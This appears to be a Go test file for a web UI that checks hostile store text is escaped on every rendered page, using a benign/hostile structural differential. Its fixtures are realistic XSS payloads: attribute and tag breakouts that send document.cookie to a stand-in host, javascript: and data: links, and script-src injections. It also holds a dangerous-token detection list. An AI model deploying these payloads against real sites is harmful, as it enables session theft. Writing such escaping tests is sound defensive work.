package ui

import (
	"regexp"
	"strings"
	"testing"

	g "maragu.dev/gomponents"

	"github.com/ZacxDev/cairn/internal/report"
	"github.com/ZacxDev/cairn/internal/store"
)

// 🔴 THE HOSTILE FIXTURES ARE REALISTIC, NOT TEXTBOOK, AND THAT IS THE POINT RATHER
// THAN FLAVOUR. This repository records that a scanner allowlists its own canonical
// examples and then scans clean — the same failure applies to an escaping test whose
// only input is `<script>alert(1)</script>`, because that string is what every
// escaper's own test suite already covers and it exercises exactly one context. Each
// string below breaks out of a DIFFERENT position and does something a real attacker
// would want: exfiltrate a session, overlay the page, or turn a ref into a
// script-scheme link.
//
// 🔴 AND THEY ARE SYNTHETIC. This repository is public and was extracted from a
// private one; `collector.invalid` is in the IANA-reserved `.invalid` TLD and
// resolves nowhere, and no scope, project or host name below belongs to anybody.
const (
	// A breakout from TEXT CONTENT that closes the enclosing element and appends an
	// image whose error handler exfiltrates the document's cookies.
	hostileTitle = `Rollout notes</span><img src=x onerror="fetch('//collector.invalid/c?'+document.cookie)">`

	// A breakout from an ATTRIBUTE VALUE: it closes the quoted value and adds an
	// event handler on the same element, which needs no new tag at all.
	hostileRef = `runbook" onmouseover="fetch('//collector.invalid/c?'+document.cookie)" data-x="`

	// An UNCLOSED tag, which is the shape that swallows the rest of the document
	// into an attribute value and is invisible to a guard looking for a matched
	// `<script>...</script>` pair. The payload is a full-viewport overlay.
	hostileAlias = `<div style="position:fixed;inset:0;z-index:2147483647;background:#fff" onclick="`

	// A script-scheme URL in an HREF POSITION. `<system>:<id>` is the documented
	// shape of a task ref, so a scheme followed by an opaque part is a WELL-FORMED
	// ref — this is reachable input, not a constructed one. `template.HTMLEscapeString`
	// has nothing to say about it: every character survives escaping intact.
	hostileTaskScript = `javascript:fetch('//collector.invalid/c?'+document.cookie)`

	// The same attack with the scheme's case varied and a leading tab. RFC 3986 §3.1
	// makes a scheme case-insensitive and the HTML specification strips leading ASCII
	// whitespace from a URL attribute before resolving it, so a browser reaches the
	// identical handler a bare `javascript:` reaches.
	//
	// ⚠ IT IS NOT WHAT PROVES `safeHref`'s CASE-FOLDING LOAD-BEARING, AND AN EARLIER
	// DRAFT OF THIS COMMENT SAID IT WAS. Measured with a mutant that deletes the
	// `ToLower`: this fixture is still refused, because an ALLOWLIST rejects every
	// casing of a scheme that is not on it. The fold's measured effect is on the
	// PERMIT side — `HTTPS://tracker.invalid/…` starts being refused. This fixture
	// earns its place for a different reason: it is what a real payload looks like
	// against a DENYLIST, which is the design this one must not drift into.
	hostileTaskMixedCase = "\t JaVaScRiPt:void(document.title=document.cookie)"

	// A `data:` URL carrying a whole HTML document, which is a same-tab navigation
	// to attacker-authored markup.
	hostileTaskData = `data:text/html;base64,PHNjcmlwdD5mZXRjaCgnLy9jb2xsZWN0b3IuaW52YWxpZC8nKTwvc2NyaXB0Pg==`

	// A scope NAME, because the heading is user text too.
	// 🔴 A HOSTILE TAG, EVEN THOUGH THE LOADER CANNOT PRODUCE ONE. `parseTagsField` folds every
	// tag to `[a-z0-9.-]`, so no store FILE can put this string on `Entry.Tags` — and that is
	// exactly why it belongs here. `ui.Entry` is a projection with three writers today
	// (`readEntry`, and two test fixtures), and a page whose escaping depended on a LOADER
	// invariant would be one new writer away from broken with nothing to catch it. The tag also
	// reaches an `href` through `tagHref`, which is the position `url.Values.Encode` covers and
	// the escaper does not.
	hostileTag = `x" onfocus="fetch('//collector.invalid/c?'+document.cookie)" data-y="`

	hostileScope = `platform</h2><script src="//collector.invalid/x.js"></script><h2>`
)

// dangerousTokens are substrings that CANNOT appear in a legitimately-rendered page,
// because this renderer emits no `img` element, no `script` element and no href
// outside [allowedSchemes].
//
// 🔴 THE LIST IS SHORT ON PURPOSE, AND THE FIRST DRAFT'S LONGER ONE WAS WRONG RATHER
// THAN MERELY NOISY. It also held `onerror=`, `onmouseover=`, `</span>` and `</h2>`,
// and every one of those fired on a page that was CORRECTLY escaped: `</span>` and
// `</h2>` are this page's own structure, and `onerror=&#34;…` is the ESCAPED,
// inert rendition of the payload — the `=` is not an escapable character, so a
// substring test on `onerror=` cannot tell live markup from escaped text. A guard
// that fires on a safe page is a guard that gets deleted, and the structural
// comparison below is what actually answers the question those tokens were reaching
// for.
var dangerousTokens = []string{
	"<img",
	"<script",
	`href="javascript:`,
	`href="data:`,
}

func countTokens(s string) int {
	n := 0
	lower := strings.ToLower(s)
	for _, tok := range dangerousTokens {
		n += strings.Count(lower, strings.ToLower(tok))
	}
	return n
}

// structure is the markup-shape of a rendered page: how many tags it opens and
// closes, and how many quoted attribute values it carries.
//
// 🔴 THIS IS THE ASSERTION THAT ACTUALLY ANSWERS "DID ANY USER TEXT BECOME MARKUP",
// AND IT IS A DIFFERENTIAL RATHER THAN A PATTERN. Escaping's whole claim is that the
// page's SHAPE does not depend on its CONTENT — so rendering one world with benign
// content and an identically-shaped world with hostile content must produce the same
// counts. An injected tag moves `lt`/`gt`; an injected attribute moves `eqQuote`.
// Nothing here needs a list of attack strings, which is what makes it blind to
// nothing a future payload invents.
type structure struct{ lt, gt, eqQuote int }

func structureOf(s string) structure {
	return structure{
		lt:      strings.Count(s, "<"),
		gt:      strings.Count(s, ">"),
		eqQuote: strings.Count(s, `="`),
	}
}

// A hostile SECTION HEADING and a hostile BULLET. Both are new surfaces: until the
// entry page existed, an entry's BODY never reached a browser at all — only its ref,
// title, aliases and task refs did.
//
// 🔴 THE BULLET IS THE WIDEST USER-TEXT SINK ON THE SURFACE AND ITS PAYLOAD IS CHOSEN
// FOR THE POSITION IT LANDS IN. It renders inside a `<pre><code>` as text content AND
// its first line decides a badge, so the fixture carries a markup breakout and a
// near-miss marker in the same line: a renderer that keyed the badge on a substring
// rather than on `store.OpennessPopulation` would light the OPEN badge for it.
const (
	hostileHeading = `## Pointers</h3><img src=x onerror="fetch('//collector.invalid/c?'+document.cookie)"><h3>`
	hostileBullet  = `- OPENISH: </code></pre><img src=x onerror="fetch('//collector.invalid/c')"> see the runbook`
	hostileBody    = `prose</code></pre><script src="//collector.invalid/x.js"></script><pre><code>`

	// 🔴 A PAYLOAD INSIDE A BACKTICK SPAN, BECAUSE THE INLINE-CODE RENDERING IS A SECOND
	// PARSE OF THE SAME ATTACKER-AUTHORED TEXT AND A NEW PLACE THE SPLIT COULD GO WRONG.
	// `inlineCode` cuts the line at the backticks and builds an `h.Code` node around the
	// inside, so the inside is a position no fixture reached before this: a payload that
	// escaped there would land in element content that the renderer, not the store, chose to
	// create. It closes an element and opens an `<img>`, so an unescaped span breaks the
	// `<pre><code>` open and the structural differential moves.
	//
	// ⚠ BOTH WORLDS CARRY EXACTLY ONE BACKTICK PAIR ON THIS LINE, WHICH IS WHAT KEEPS THE
	// DIFFERENTIAL ABOUT ESCAPING. The pair itself becomes markup by design — one `<code>`
	// element either way — so a hostile world with more pairs than the benign one would move
	// `lt`/`gt` for a reason that is not an injection and the comparison would read as a
	// finding when it is a fixture mismatch.
	hostileCodeSpan = "  see `</code><img src=x onerror=\"fetch('//collector.invalid/c')\">` for the steps"
	benignCodeSpan  = "  see `docs/rollout.md` for the steps"

	// 🔴 THE RAW VIEW'S FIXTURE, AND IT IS THE WIDEST SINK ON THE SURFACE: the WHOLE
	// FILE, front matter included, through a single `g.Text`. Every other fixture here is
	// something a parser accepted first.
	//
	// ⚠ SHAPE-MATCHED LINE FOR LINE WITH THE BENIGN ONE, which is what keeps the
	// differential about ESCAPING rather than about fixture size — the same rule the
	// code-span pair above is written to. Neither carries a backtick, so neither adds a
	// `<code>` element on its own.
	hostileRaw = "---\nservice: runbook\n---\n\n## What it is\n\n" +
		`</code></pre><script src="//collector.invalid/raw.js"></script><pre><code>`
	benignRaw = "---\nservice: runbook\n---\n\n## What it is\n\n" +
		`the rollout runbook, as the file has it`
)

// refsResolvingToTheirOwnText builds `EntryRef`s whose RESOLVED URL is the ref's own text.
//
// 🔴 THAT IS A REACHABLE STATE, NOT A CONVENIENCE FOR KEEPING THESE FIXTURES SHORT, AND IT IS
// THE STATE THESE FIXTURES EXIST TO TEST. `store.RefURL` builds a self-hosted system's URL by
// appending a path to an OPERATOR-SUPPLIED base and deliberately does not scheme-check it, so
// any string an operator can put in `CAIRN_REF_BASE_<SYSTEM>` can reach `URL` — `javascript:`
// included. Setting `URL` to the hostile text is the shortest spelling of that world.
//
// ⚠ AND IT KEEPS THIS PAIR OF WORLDS SHAPE-FOR-SHAPE ACROSS THE TYPE CHANGE: before
// `EntryRef` existed the RAW ref was the href candidate, so `URL == Raw` is the fixture under
// which every assertion in this file measures the same thing it measured then.
func refsResolvingToTheirOwnText(raw ...string) []EntryRef {
	out := make([]EntryRef, 0, len(raw))
	for _, r := range raw {
		out = append(out, EntryRef{Raw: r, URL: r})
	}
	return out
}

// benignWorld mirrors [hostileWorld] SHAPE FOR SHAPE: one scope, one entry, one
// alias, four task refs of which exactly three are refused by [safeHref] and one is
// a link, two sections, one bullet and one malformed row. A benign world of a different
// shape would produce different counts for a reason that has nothing to do with
// escaping, and the comparison would be noise.
func benignWorld() []Scope {
	return []Scope{{
		ID:   fixtureScope,
		Name: "platform",
		Entries: []Entry{{
			Ref:      "runbook",
			Title:    "Rollout notes",
			Filename: "runbook.md",
			Raw:      benignRaw,
			Aliases:  []string{"rollout"},
			// The SAME COUNT as the hostile world's, because the structural differential is a
			// count of markup characters and a list of a different length would break it for
			// the wrong reason.
			Tags: []string{"marketing", "plain-tag"},
			Tasks: refsResolvingToTheirOwnText(
				"jira:PLAT-1",
				"jira:PLAT-2",
				"jira:PLAT-3",
				"https://tracker.invalid/issue/4711",
			),
			Sections: []Section{
				{Heading: "## Pointers", Body: "prose"},
				{Heading: store.NuanceHeading, Body: "- a bullet", Bullets: []Bullet{
					{Lines: []string{"- a bullet", benignCodeSpan}, Date: "2000-06-01", Population: store.PopulationNone},
				}},
			},
			BulletCount: 1,
		}},
		Malformed: []Malformed{{Label: "platform/broken.md", Reason: "missing `service:`"}},
	}}
}

func hostileWorld() []Scope {
	return []Scope{{
		// The ID is NOT hostile: it is minted by `control.DerivedID` over a URL-safe
		// alphabet and can never be anything else, so a hostile one would be testing a
		// value the type cannot hold. Same id as the benign world so the two pages carry
		// the same links and the structural differential stays about content.
		ID:   fixtureScope,
		Name: hostileScope,
		Entries: []Entry{{
			Ref:      hostileRef,
			Title:    hostileTitle,
			Filename: hostileRef + ".md",
			Raw:      hostileRaw,
			Aliases:  []string{hostileAlias},
			// TWO tags so the list renders more than one `<li>` — a one-element list cannot
			// see a separator bug — and the second is benign so the differential has a link
			// that is not hostile on both pages.
			Tags: []string{hostileTag, "plain-tag"},
			Tasks: refsResolvingToTheirOwnText(
				hostileTaskScript,
				hostileTaskMixedCase,
				hostileTaskData,
				// One BENIGN ref, so the page's link rendering is exercised too. A
				// page on which every ref is refused would pass a "no href=javascript"
				// assertion by never emitting an href at all.
				"https://tracker.invalid/issue/4711",
			),
			Sections: []Section{
				{Heading: hostileHeading, Body: hostileBody},
				{Heading: store.NuanceHeading, Body: hostileBullet, Bullets: []Bullet{
					// 🔴 `PopulationNone`, WITH AN `OPENISH:` FIRST LINE. The badge is
					// derived from this field and never from the text, so a renderer
					// that read the words would light the OPEN badge here and the
					// structural differential below would see the extra element.
					{Lines: []string{hostileBullet, hostileCodeSpan}, Date: "2000-06-01", Population: store.PopulationNone},
				}},
			},
			BulletCount: 1,
		}},
		Malformed: []Malformed{{Label: hostileRef + "/broken.md", Reason: hostileBody}},
	}}
}

// renderCSRF is a FIXED token, and the same one for the hostile and the benign world.
//
// 🔴 THE STRUCTURAL DIFFERENTIAL BELOW IS A COUNT OF `<`, `>` AND `="`, SO ANYTHING THAT
// RENDERS IN ONE WORLD AND NOT THE OTHER BREAKS IT FOR THE WRONG REASON. The sign-out
// form renders only when a token is present, so passing one here — the same one to both
// — keeps the two pages the same SHAPE while bringing the form inside the escaping
// assertions rather than leaving a new markup sink outside them.
const renderCSRF = "a-fixed-fixture-csrf-token"

func viewOf(viewer string, scopes []Scope) PageView {
	return PageView{Viewer: viewer, CSRF: renderCSRF, Scopes: scopes}
}

func render(t *testing.T, viewer string, scopes []Scope) string {
	t.Helper()
	return renderNode(t, Page(viewOf(viewer, scopes)))
}

func renderNode(t *testing.T, node g.Node) string {
	t.Helper()
	var b strings.Builder
	if err := node.Render(&b); err != nil {
		t.Fatalf("the page did not render: %v", err)
	}
	return b.String()
}

// renderedPages is the SAME page, rendered over two worlds of identical shape, for each
// of the three browse pages.
//
// 🔴 ALL THREE, BECAUSE THE DIFFERENTIAL IS PER PAGE AND THE ENTRY PAGE IS THE ONE THAT
// MATTERS. The root page shows no entry body at all; the scope page shows refs and
// titles; only the entry page renders sections and bullets, which is the surface this
// change ADDED and the only one where a store file's prose reaches the browser. A guard
// that ran over the root alone would be green for a broken entry page.
func renderedPages(t *testing.T, world []Scope) map[string]string {
	t.Helper()
	v := viewOf("operator@example.invalid", world)
	scopeView := v
	scopeView.Scope = &world[0]
	entryView := scopeView
	entryView.Entry = &world[0].Entries[0]
	searchView := v
	searchView.Query = world[0].Entries[0].Ref
	searchView.Results = &SearchResults{
		Query:          world[0].Entries[0].Ref,
		TotalHits:      1,
		ScopesSearched: []string{world[0].Name},
		Hits: []Hit{{
			ScopeID: world[0].ID,
			Scope:   world[0].Name,
			Ref:     world[0].Entries[0].Ref,
			Section: world[0].Entries[0].Sections[0].Heading,
			Start:   1,
			Lines:   world[0].Entries[0].Sections[1].Bullets[0].Lines,
			Score:   1,
			Basis:   report.BasisLine,
		}},
	}
	return map[string]string{
		"root":     renderNode(t, Page(v)),
		"navigate": renderNode(t, NavigatePage(v)),
		"scope":    renderNode(t, ScopePage(scopeView)),
		"entry":    renderNode(t, EntryPage(entryView)),
		// 🔴 THE RAW VIEW IS ITS OWN PAGE STATE AND THE DIFFERENTIAL IS PER STATE, so
		// omitting it would leave the surface's WIDEST sink — the whole file through one
		// `g.Text` — covered by nothing here. It is the same `EntryPage`, so a row rather
		// than a second harness.
		"entry-raw": renderNode(t, EntryPage(rawViewOf(entryView))),
		"search":    renderNode(t, Page(searchView)),
	}
}

// TestHostileEntryTextIsEscapedOnEveryBrowsePage is the XSS guard over the pages this
// change added, and it is the SAME differential `TestHostileEntryTextIsEscaped` runs over
// the root — applied per page, because each renders a different subset of the store.
func TestHostileEntryTextIsEscapedOnEveryBrowsePage(t *testing.T) {
	// POSITIVE CONTROL — the new fixtures really do carry markup the counters can see.
	// Reported as a pair with the zeroes below, never on their own.
	newlyReachable := hostileHeading + hostileBullet + hostileBody + hostileCodeSpan
	if n := countTokens(newlyReachable); n == 0 {
		t.Fatal("POSITIVE CONTROL FAILED: the heading/bullet/body/code-span fixtures carry NOTHING the token " +
			"scanner recognises, so a zero on the rendered entry page below would mean nothing")
	}
	// 🔴 AND THE SAME CONTROL FOR THE RAW FIXTURE, WHICH HAD NONE. The `entry-raw` row
	// carries the widest sink on the surface — the whole file — and its two fixtures were
	// in neither the token count above nor the shape comparison below. If `hostileRaw`
	// were ever softened to something whose markup shape equals `benignRaw`'s, that row
	// would compare equal, the token scan would find nothing, and NO control in this test
	// would notice: the widest sink would pass vacuously in a fully green suite.
	if structureOf(hostileRaw) == structureOf(benignRaw) {
		t.Fatalf("POSITIVE CONTROL FAILED: the hostile and benign RAW fixtures carry the same markup "+
			"shape (%+v), so the `entry-raw` row of the differential below cannot detect an injection "+
			"into the raw view at all", structureOf(hostileRaw))
	}
	if n := countTokens(hostileRaw); n == 0 {
		t.Fatal("POSITIVE CONTROL FAILED: `hostileRaw` carries NOTHING the token scanner recognises, " +
			"so a zero on the rendered raw page would mean nothing")
	}

	benignSectionContent := "## Pointers" + "prose" + "- a bullet" + benignCodeSpan
	if structureOf(benignSectionContent) == structureOf(newlyReachable) {
		t.Fatalf("POSITIVE CONTROL FAILED: the hostile section fixtures carry the same markup shape as the "+
			"benign ones (%+v), so the differential below cannot detect an injection into a section or a "+
			"bullet and its agreement would mean nothing", structureOf(newlyReachable))
	}

	hostile := renderedPages(t, hostileWorld())
	benign := renderedPages(t, benignWorld())
	if len(hostile) != len(benign) || len(hostile) == 0 {
		t.Fatalf("the two renders produced %d and %d pages; the comparison below needs the same set",
			len(hostile), len(benign))
	}

	checked := 0
	for name, got := range hostile {
		want := benign[name]
		if want == "" {
			t.Fatalf("no benign render for page %q, so its comparison is vacuous", name)
		}
		checked++
		if gotStructure, wantStructure := structureOf(got), structureOf(want); gotStructure != wantStructure {
			t.Errorf("the %s page's MARKUP SHAPE differs between the hostile and benign worlds: got %+v, "+
				"want %+v.\nThe two worlds have the same number of scopes, entries, aliases, refs, sections, "+
				"bullets and malformed rows, so every difference here is user text that became markup. "+
				"gomponents escapes text and attribute VALUES; it does not neutralise a URL scheme and it "+
				"writes an element or attribute NAME verbatim.", name, gotStructure, wantStructure)
		}
		for _, tok := range dangerousTokens {
			if n := strings.Count(strings.ToLower(got), strings.ToLower(tok)); n > 0 {
				t.Errorf("the %s page carries %d occurrence(s) of %q, which this renderer never emits: "+
					"it came out of store content.", name, n, tok)
			}
		}
	}
	if checked == 0 {
		t.Fatal("NO page was compared, so this test measured nothing")
	}

	// 🔴 AND THE WHOLE ESCAPED STRING, PINNED, FOR EACH OF THE THREE NEW SINKS. A guard
	// on the ABSENCE of a token passes for a page that dropped the content entirely; this
	// is what says the text is present AND inert. The literals are hand-written from the
	// HTML escaping rules rather than derived from the function under test.
	//
	// ⚠ TWO OF THE THREE ARE PINNED MINUS A PREFIX NOW, AND THE `TrimPrefix` CALLS ARE THE
	// POINT RATHER THAN NOISE. The entry page renders a `##` run as a heading and a list
	// marker as an `<li>`, so those characters are STRUCTURE on the page and no longer text
	// — which is a transformation, and a transformation is where content gets lost. The trim
	// is spelled here with a literal prefix rather than by calling `headingParts` or
	// `Bullet.Body`: deriving the expectation from the functions under test would make this
	// assertion true however they behaved. What it measures is unchanged and is the thing
	// that matters — every remaining byte of each payload is on the page, escaped, rather
	// than dropped by the new rendering.
	//
	// `hostileBullet` keeps its `OPENISH:` because `store.MarkerSpan` refuses it: it is a
	// near miss, and a near miss's marker text staying on the page is the whole finding.
	entry := hostile["entry"]
	for _, want := range []string{
		escapeForTest(strings.TrimPrefix(hostileHeading, "## ")),
		escapeForTest(strings.TrimPrefix(hostileBullet, "- ")),
		escapeForTest(hostileBody),
		// The payload from INSIDE the backtick span, which `inlineCode` moved into an
		// `h.Code` node of the renderer's own making. `hostileCodeSpan` as a whole is no
		// longer contiguous on the page — the backticks became an element boundary — so what
		// is pinned is the part that was between them, escaped and whole.
		escapeForTest(`</code><img src=x onerror="fetch('//collector.invalid/c')">`),
	} {
		if !strings.Contains(entry, want) {
			t.Errorf("the entry page does not carry the fully escaped form of a hostile string; it was "+
				"DROPPED rather than rendered inert.\nwanted substring: %s", want)
		}
	}
	t.Logf("escaping: %d page(s) compared structurally over hostile vs benign worlds; %d dangerous token(s) "+
		"in the new section/bullet fixtures, 0 in any rendered page", checked, countTokens(newlyReachable))
}

// TestTheBadgeComesFromThePopulationAndNotFromTheWords is the REGRESSION test for the
// distinction `store.JournalBullet.OpennessPopulation` exists to make.
//
// 🔴 A NEAR MISS IS A BULLET THAT TRIED TO WRITE A MARKER AND MISSED THE GRAMMAR, AND IT
// MUST NOT SHOW THE OPEN BADGE. `report.RecalledEntry.NearMissCount`'s own comment records
// that until near misses were counted separately they were byte-identical to "no marker"
// on the read surface — the badge simply did not render, and a vanishing badge looks like
// success. So this pins both directions: the open badge appears for `PopulationOpen` and
// for nothing else, and a near miss gets its OWN badge rather than silence.
//
// ⚠ IT DRIVES THE PARSER RATHER THAN HAND-BUILDING THE POPULATIONS, so it also measures
// that the near-miss fixture really IS a near miss to `store` — a hand-set
// `Population: PopulationNearMiss` would assert the renderer against a value this test
// invented.
func TestTheBadgeComesFromThePopulationAndNotFromTheWords(t *testing.T) {
	body := strings.Join([]string{
		"- OPEN: the declared one",
		"- OPEN the near miss, no colon",
		"- an ordinary bullet",
	}, "\n")
	parsed := store.ParseJournalBullets(body)
	if len(parsed) != 3 {
		t.Fatalf("the fixture parsed to %d bullets, want 3; the assertions below would be about the wrong lines", len(parsed))
	}

	// INSTRUMENT CONTROL: the three lines really are in three different populations, so
	// the render comparison below is about the renderer and not about a fixture whose
	// lines all mean the same thing.
	wantPopulations := []string{store.PopulationOpen, store.PopulationNearMiss, store.PopulationNone}
	var section Section
	section.Heading = store.NuanceHeading
	section.Body = body
	for i, b := range parsed {
		if got := b.OpennessPopulation(); got != wantPopulations[i] {
			t.Fatalf("bullet %d parsed as population %q, want %q. The fixture is not exercising the "+
				"distinction this test is named for.", i, got, wantPopulations[i])
		}
		section.Bullets = append(section.Bullets, Bullet{Lines: b.Lines, Date: b.Date, Population: b.OpennessPopulation()})
	}

	world := benignWorld()
	world[0].Entries[0].Sections = []Section{section}
	view := viewOf("operator@example.invalid", world)
	view.Scope = &world[0]
	view.Entry = &world[0].Entries[0]
	out := renderNode(t, EntryPage(view))

	openBadges := strings.Count(out, `<span class="badge badge-open">OPEN</span>`)
	nearBadges := strings.Count(out, `<span class="badge badge-near">near-miss marker</span>`)
	if openBadges != 1 {
		t.Errorf("the entry page rendered %d OPEN badge(s) over a section with exactly ONE declared `OPEN:` "+
			"bullet, one near miss and one plain line. A renderer keyed on the WORD would light two.", openBadges)
	}
	if nearBadges != 1 {
		t.Errorf("the entry page rendered %d near-miss badge(s), want 1. A near miss rendered as nothing is "+
			"byte-identical to a bullet with no marker, which is the state that hides a stale open action.",
			nearBadges)
	}
	// The near-miss line's own text must still be on the page: the badge is the claim, the
	// line is the evidence, and a page that showed one without the other is unreadable.
	if !strings.Contains(out, escapeForTest("OPEN the near miss, no colon")) {
		t.Error("the near-miss bullet's text is not on the page, so its badge names a line nobody can read")
	}
	t.Logf("badges: %d open, %d near-miss over populations %v", openBadges, nearBadges, wantPopulations)
}

// TestAMalformedEntryRendersAsMalformed pins that a file the loader REFUSED is on the
// page rather than absent.
//
// 🔴 A BROWSER THAT DROPS THEM DISAGREES WITH THE CLI WHILE LOOKING COMPLETE, which is
// why this is a regression test and not a nicety. `store.LoadStore` loads with `Collect`
// because failing closed cost a whole scope over one bad file, and `internal/report`
// renders every collected row; a page that showed only the good entries would be a
// shorter, WRONG store with no symptom.
func TestAMalformedEntryRendersAsMalformed(t *testing.T) {
	world := benignWorld()
	if len(world[0].Malformed) == 0 {
		t.Fatal("the benign fixture carries no malformed row, so this test would pass vacuously")
	}
	row := world[0].Malformed[0]

	view := viewOf("operator@example.invalid", world)
	view.Scope = &world[0]
	out := renderNode(t, ScopePage(view))

	if !strings.Contains(out, escapeForTest(row.Label)) {
		t.Errorf("the scope page does not name the malformed file %q. A page that drops it shows a complete-"+
			"looking scope that is missing entries.", row.Label)
	}
	if !strings.Contains(out, escapeForTest(row.Reason)) {
		t.Errorf("the scope page names %q without the loader's reason, so a reader cannot tell a broken file "+
			"from one they are not allowed to see", row.Label)
	}

	// NEGATIVE CONTROL: a scope with no malformed rows renders no block, so the assertion
	// above is about the rows and not about a heading that is always there.
	clean := benignWorld()
	clean[0].Malformed = nil
	cleanView := viewOf("operator@example.invalid", clean)
	cleanView.Scope = &clean[0]
	if cleanOut := renderNode(t, ScopePage(cleanView)); strings.Contains(cleanOut, "Unreadable entry files") {
		t.Error("a scope with NO malformed rows still rendered the unreadable-files block, so its presence " +
			"above says nothing about whether the rows reached the page")
	}
	t.Logf("malformed: %q rendered with its reason; a clean scope renders no block", row.Label)
}

// renderScopeOf is the SCOPE page over a one-scope world — the page that renders an
// entry's ref, title, aliases and task refs.
//
// ⚠ IT WAS THE ROOT PAGE AND IT MOVED, WHICH IS A CONSEQUENCE OF THE INFORMATION
// ARCHITECTURE RATHER THAN A WEAKENING. The root used to render every entry of every
// scope inline; it now renders a CARD per scope, listing refs and no titles, aliases or
// task refs at all. The assertions below are about those four fields, so they follow them
// to the page that shows them. The root's own escaping is not left unmeasured —
// `TestHostileEntryTextIsEscapedOnEveryBrowsePage` runs the structural differential over
// all five renders including the root.
func renderScopeOf(t *testing.T, viewer string, scopes []Scope) string {
	t.Helper()
	v := viewOf(viewer, scopes)
	v.Scope = &scopes[0]
	return renderNode(t, ScopePage(v))
}

// TestHostileEntryTextIsEscaped is the XSS guard.
func TestHostileEntryTextIsEscaped(t *testing.T) {
	// POSITIVE CONTROL 1 — the token scanner can see the thing. Reported as a pair
	// with the zero below, never on its own.
	raw := hostileScope + hostileRef + hostileTitle + hostileAlias +
		`href="` + hostileTaskScript + `"` + `href="` + hostileTaskData + `"`
	inInput := countTokens(raw)
	if inInput == 0 {
		t.Fatal("POSITIVE CONTROL FAILED: the token scanner found NOTHING dangerous in the raw hostile fixtures, " +
			"so its zero on the rendered page below would mean nothing. Either dangerousTokens no longer matches " +
			"the fixtures or the fixtures were softened.")
	}

	// POSITIVE CONTROL 2 — the STRUCTURE counter can see an injection. If these
	// strings reached the page unescaped the counts below would move, and this is the
	// measurement that says so rather than an assumption that they would.
	benignContent := "platform" + "runbook" + "Rollout notes" + "rollout"
	hostileContent := hostileScope + hostileRef + hostileTitle + hostileAlias
	if structureOf(benignContent) == structureOf(hostileContent) {
		t.Fatalf("POSITIVE CONTROL FAILED: the hostile fixtures carry the same markup shape as the benign ones "+
			"(%+v), so the differential below cannot detect an injection and its agreement would mean nothing.",
			structureOf(benignContent))
	}

	out := renderScopeOf(t, "operator@example.invalid", hostileWorld())
	benignOut := renderScopeOf(t, "operator@example.invalid", benignWorld())

	// 🔴 THE DIFFERENTIAL. Same shape, different content, identical markup structure.
	gotStructure, wantStructure := structureOf(out), structureOf(benignOut)
	if gotStructure != wantStructure {
		t.Errorf("the hostile page's MARKUP SHAPE differs from the benign page's: got %+v, want %+v.\n"+
			"The two worlds have the same number of scopes, entries, aliases and refused/permitted refs, so every "+
			"difference here is user text that became markup. gomponents escapes text and attribute VALUES; it "+
			"does not neutralise a URL scheme and it writes an element or attribute NAME verbatim — check which "+
			"of those the new code reached for.", gotStructure, wantStructure)
	}

	inOutput := countTokens(out)
	t.Logf("dangerous tokens: %d in the raw fixtures, %d in the rendered page; structure hostile=%+v benign=%+v",
		inInput, inOutput, gotStructure, wantStructure)
	if inOutput != 0 {
		for _, tok := range dangerousTokens {
			if n := strings.Count(strings.ToLower(out), strings.ToLower(tok)); n > 0 {
				t.Errorf("the rendered page carries %d occurrence(s) of %q, which this renderer never emits: "+
					"it came out of store content.", n, tok)
			}
		}
	}

	// 🔴 PIN THE WHOLE ESCAPED STRING, NOT THE ABSENCE OF A WORD. A guard on words is
	// walkable by rewording; these literals are hand-written from the HTML escaping
	// rules rather than derived from the function under test, so a change in what the
	// renderer escapes fails here rather than silently agreeing with itself.
	wantEscaped := []string{
		`Rollout notes&lt;/span&gt;&lt;img src=x onerror=&#34;fetch(&#39;//collector.invalid/c?&#39;+document.cookie)&#34;&gt;`,
		`runbook&#34; onmouseover=&#34;fetch(&#39;//collector.invalid/c?&#39;+document.cookie)&#34; data-x=&#34;`,
		`&lt;div style=&#34;position:fixed;inset:0;z-index:2147483647;background:#fff&#34; onclick=&#34;`,
		`platform&lt;/h2&gt;&lt;script src=&#34;//collector.invalid/x.js&#34;&gt;&lt;/script&gt;&lt;h2&gt;`,
	}
	for _, want := range wantEscaped {
		if !strings.Contains(out, want) {
			t.Errorf("the rendered page does not carry the fully escaped form of a hostile string.\nwanted substring: %s", want)
		}
	}

	// The refused refs are VISIBLE and INERT — present as text, absent as links.
	for _, refused := range []string{hostileTaskScript, hostileTaskMixedCase, hostileTaskData} {
		trimmed := strings.TrimSpace(refused)
		if !strings.Contains(out, escapeForTest(trimmed)) {
			t.Errorf("a refused task ref was DROPPED rather than rendered as text: %q. "+
				"Dropping hides a fact the file carries; the page must show it and not link it.", refused)
		}
		if strings.Contains(strings.ToLower(out), `href="`+strings.ToLower(trimmed)) {
			t.Errorf("a refused task ref reached an href: %q", refused)
		}
	}

	// The benign ref IS a link, so the refusals above are not "no link is ever made".
	if !strings.Contains(out, `<a href="https://tracker.invalid/issue/4711">`) {
		t.Error("the benign https ref did not render as a link, so every `no href=javascript` assertion above " +
			"is satisfied by a page with no links at all")
	}
}

// entryPageOver renders the entry page over ONE entry built from a real nuance body, so the
// assertions below are about the renderer over the store's own parse rather than over
// populations and prefixes a test invented.
//
// 🔴 IT DRIVES `readEntry`'s OWN PROJECTION, NOT A HAND-BUILT `Bullet`. Every field the new
// rendering branches on — the population, the sha, the unreachable-marker list, where the
// marker prefix ENDS — comes out of `internal/store`, and a fixture that set them by hand
// would assert the renderer against values this file decided. `sectionsFromBody` is the same
// three calls `StoreSource.readEntry` makes, spelled here because these tests hold no store
// on disk.
func entryPageOver(t *testing.T, sections []Section) string {
	t.Helper()
	world := benignWorld()
	world[0].Entries[0].Sections = sections
	view := viewOf("operator@example.invalid", world)
	view.Scope = &world[0]
	view.Entry = &world[0].Entries[0]
	return renderNode(t, EntryPage(view))
}

// sectionsFromBody parses a nuance body with the store's parsers and projects it exactly as
// `StoreSource.readEntry` does.
func sectionsFromBody(t *testing.T, heading, body string) []Section {
	t.Helper()
	section := Section{Heading: heading, Body: body}
	if heading == store.NuanceHeading {
		for _, b := range store.ParseJournalBullets(body) {
			section.Bullets = append(section.Bullets, Bullet{
				Lines:       b.Lines,
				Date:        b.Date,
				Population:  b.OpennessPopulation(),
				ResolvedBy:  b.ResolvedBy,
				Unreachable: b.UnreachableMarkers(),
			})
		}
		if len(section.Bullets) == 0 {
			t.Fatalf("the nuance fixture parsed to NO bullet, so every bullet assertion below would be vacuous:\n%s", body)
		}
	}
	return []Section{section}
}

// elementsOf returns the inner text of every `open`…`close` region of `s`.
//
